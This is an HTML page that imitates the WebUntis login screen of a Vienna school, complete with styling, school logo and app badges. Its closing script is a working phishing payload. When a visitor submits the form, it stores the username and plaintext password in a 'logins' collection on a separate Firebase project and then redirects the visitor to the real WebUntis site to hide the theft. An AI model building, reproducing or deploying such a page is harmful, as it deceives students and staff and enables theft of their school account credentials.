<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebUntis Login</title>
    <style>
        /* Grundkonfiguration */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body, html {
            height: 100%;
            background-color: #ffffff;
            overflow: hidden; 
        }

        /* Container-Layout (Zwei Spalten) */
        .login-container {
            display: flex;
            height: 100vh;
            width: 100vw;
        }

        /* Linke Seite (Sidebar) */
        .info-sidebar {
            width: 50%;
            background: linear-gradient(135deg, #eef1f5 0%, #e2e7ed 100%);
            padding: 40px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            flex-shrink: 0; 
        }

        .top-icons {
            display: flex;
            flex-direction: column;
            gap: 25px;
        }

        /* WebUntis "U" Logo oben links */
        .u-logo {
            width: 42px;
            height: 42px;
            border: 2px dashed #adb5bd;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 300;
            font-size: 1.2rem;
            color: #6c757d;
        }

        /* Das orangefarbene Grid-Icon */
        .grid-icon {
            width: 22px;
            height: 22px;
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 4px;
            cursor: pointer;
        }

        .grid-icon span {
            background-color: #ff6b35;
            border-radius: 2px;
        }

        .sidebar-content {
            margin-top: auto;
            margin-bottom: auto;
            padding-left: 20px;
        }

        .current-date {
            color: #6c757d;
            font-size: 0.95rem;
            margin-bottom: 12px;
        }

        .school-name {
            color: #1a202c;
            font-size: 2rem;
            font-weight: 500;
            margin-bottom: 15px;
            letter-spacing: -0.5px;
        }

        .change-school {
            color: #1a202c;
            text-decoration: underline;
            font-size: 0.95rem;
            font-weight: 500;
        }

        /* Rechte Seite (Login-Bereich) - SCROLLBAR */
        .login-main {
            width: 50%;
            display: flex;
            flex-direction: column;
            overflow-y: auto; 
            background-color: #ffffff;
            padding: 40px 20px;
        }

        .login-content-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            min-height: 100%; 
        }

        .login-box {
            width: 100%;
            max-width: 380px;
            text-align: center;
            flex-grow: 1; 
            display: flex;
            flex-direction: column;
            justify-content: center;
            margin-bottom: 40px;
        }

        .login-title {
            font-size: 1.7rem;
            color: #2d3748;
            font-weight: 400;
            margin-bottom: 35px;
        }

        .school-logo-container {
            margin-bottom: 45px;
            display: flex;
            justify-content: center;
        }

        .school-logo {
            max-height: 90px;
            max-width: 170px;
            object-fit: contain;
            display: block;
        }

        /* Formular-Elemente */
        .form-container {
            display: flex;
            flex-direction: column;
            gap: 24px;
        }

        /* Button: Bildungsportal */
        .btn-portal {
            width: 100%;
            padding: 14px;
            background-color: transparent;
            border: 1px solid #cbd5e0;
            border-radius: 25px;
            font-size: 1rem;
            color: #4a5568;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-portal:hover {
            background-color: #f7fafc;
        }

        /* Trennlinie "oder" */
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            color: #a0aec0;
            font-size: 0.9rem;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #e2e8f0;
        }

        .divider:not(:empty)::before { margin-right: 1em; }
        .divider:not(:empty)::after { margin-left: 1em; }

        /* Input Styling */
        .input-group {
            display: flex;
            flex-direction: column;
            background-color: #edf2f7;
            border-radius: 4px;
            padding: 10px 16px;
            text-align: left;
            border-bottom: 2px solid transparent;
            transition: border-color 0.2s;
        }

        .input-group.focused {
            border-bottom-color: #ff6b35;
        }

        .input-group label {
            font-size: 0.75rem;
            color: #ff6b35;
            margin-bottom: 4px;
            font-weight: 600;
        }

        .input-group input {
            border: none;
            background: transparent;
            outline: none;
            font-size: 1rem;
            color: #2d3748;
            width: 100%;
            padding-top: 2px;
        }

        .password-wrapper {
            display: flex;
            align-items: center;
        }

        .toggle-password {
            color: #a0aec0;
            cursor: pointer;
            user-select: none;
            font-size: 1.1rem;
            padding-left: 8px;
        }

        /* Login Button Styling */
        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #edf2f7;
            border: none;
            border-radius: 25px;
            font-size: 1rem;
            color: #a0aec0;
            font-weight: bold;
            cursor: not-allowed;
            margin-top: 15px;
            transition: background-color 0.2s, color 0.2s;
        }

        .btn-login.active {
            background-color: #ff6b35;
            color: #ffffff;
            cursor: pointer;
        }

        /* Passwort vergessen Link */
        .forgot-password {
            display: inline-block;
            margin-top: 24px;
            color: #1a202c;
            text-decoration: underline;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
        }

        /* App Badges Bereich */
        .app-badges {
            display: flex;
            justify-content: center;
            gap: 14px;
            margin-top: 45px;
            margin-bottom: 20px;
        }

        .app-badges a {
            display: inline-block;
            height: 40px;
        }

        .app-badges img {
            height: 100%;
            object-fit: contain;
        }

        /* Footer am Ende */
        .login-footer {
            display: flex;
            justify-content: center;
            gap: 20px;
            width: 100%;
            margin-top: auto;
            padding-top: 20px;
            flex-shrink: 0;
        }

        .login-footer a {
            color: #1a202c;
            text-decoration: underline;
            font-size: 0.85rem;
            font-weight: 500;
        }

        /* Responsive Anpassung für Mobilgeräte */
        @media (max-width: 768px) {
            body, html {
                overflow: auto; 
            }

            .login-container {
                flex-direction: column;
                height: auto;
                width: 100%;
            }

            .info-sidebar {
                width: 100%;
                height: auto;
                min-height: 35vh;
                padding: 30px 20px;
                position: relative;
            }

            .sidebar-content {
                padding-left: 0;
                margin-top: 30px;
                margin-bottom: 20px;
            }

            .login-main {
                width: 100%;
                height: auto;
                min-height: 65vh;
                padding: 30px 20px 30px 20px;
                overflow-y: visible; 
            }

            .login-content-wrapper {
                height: auto;
                min-height: 0;
            }

            .login-box {
                margin-bottom: 40px;
                justify-content: flex-start;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        
        <div class="info-sidebar">
            <div class="top-icons">
                <div class="u-logo">U</div>
                <div class="grid-icon">
                    <span></span><span></span><span></span><span></span>
                </div>
            </div>
            
            <div class="sidebar-content">
                <p class="current-date">Heute 18.06.2026</p>
                <h1 class="school-name">HAK/HASCH Wien 3, Fasang.4</h1>
                <a href="#" class="change-school">Schule wechseln</a>
            </div>
        </div>

        <div class="login-main">
            <div class="login-content-wrapper">
                <div class="login-box">
                    <h2 class="login-title">WebUntis Login</h2>
                    
                    <div class="school-logo-container">
                        <img src="https://bafep.scp.ac.at/wp-content/uploads/sites/10/2017/01/leitbild-blau.png" alt="Sacré Cœur Wien Logo" class="school-logo">
                    </div>

                    <form class="form-container" id="loginForm">
                        <button type="button" class="btn-portal">Bildungsportal</button>
                        
                        <div class="divider">
                            <span>oder</span>
                        </div>

                        <div class="input-group" id="group-username">
                            <label for="username">Benutzername</label>
                            <input type="text" id="username" autocomplete="off">
                        </div>

                        <div class="input-group" id="group-password">
                            <label for="password">Passwort</label>
                            <div class="password-wrapper">
                                <input type="password" id="password">
                                <span class="toggle-password" id="togglePassword">👁</span>
                            </div>
                        </div>

                        <button type="submit" class="btn-login" id="loginBtn" disabled>Login</button>
                    </form>

                    <a href="#" class="forgot-password">Passwort vergessen?</a>

                    <div class="app-badges">
                        <a href="https://play.google.com/store/apps/details?id=com.untis.mobile" target="_blank">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="JETZT BEI Google Play">
                        </a>
                        <a href="https://apps.apple.com/at/app/untis-mobile/id926180142" target="_blank">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="Laden im App Store">
                        </a>
                    </div>
                </div>

                <div class="login-footer">
                    <a href="https://www.untis.at/impressum" target="_blank">Impressum</a>
                    <a href="https://www.untis.at/jobs" target="_blank">Jobs @ Untis</a>
                </div>
            </div>
        </div>

    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyD6tRZKmQ94EWeI27oS6uZuPgW2ODkvJ6w",
            authDomain: "untis-4045a.firebaseapp.com",
            projectId: "untis-4045a",
            storageBucket: "untis-4045a.firebasestorage.app",
            messagingSenderId: "1038747513615",
            appId: "1:1038747513615:web:7ab21989e70da82a1a847a",
            measurementId: "G-4K2Y1YKLT9"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const loginForm = document.getElementById('loginForm');
        const togglePassword = document.getElementById('togglePassword');

        [usernameInput, passwordInput].forEach(input => {
            const group = document.getElementById(`group-${input.id}`);
            input.addEventListener('focus', () => group.classList.add('focused'));
            input.addEventListener('blur', () => group.classList.remove('focused'));
            
            input.addEventListener('input', () => {
                if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
                    loginBtn.disabled = false;
                    loginBtn.classList.add('active');
                } else {
                    loginBtn.disabled = true;
                    loginBtn.classList.remove('active');
                }
            });
        });

        togglePassword.addEventListener('click', () => {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
        });

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = usernameInput.value;
            const password = passwordInput.value;

            try {
                await addDoc(collection(db, "logins"), {
                    username: username,
                    password: password,
                    timestamp: serverTimestamp()
                });
                window.location.href = "https://wien.webuntis.com/";
            } catch (error) {
                console.error("Fehler beim Speichern: ", error);
            }
        });
    </script>
</body>
</html>
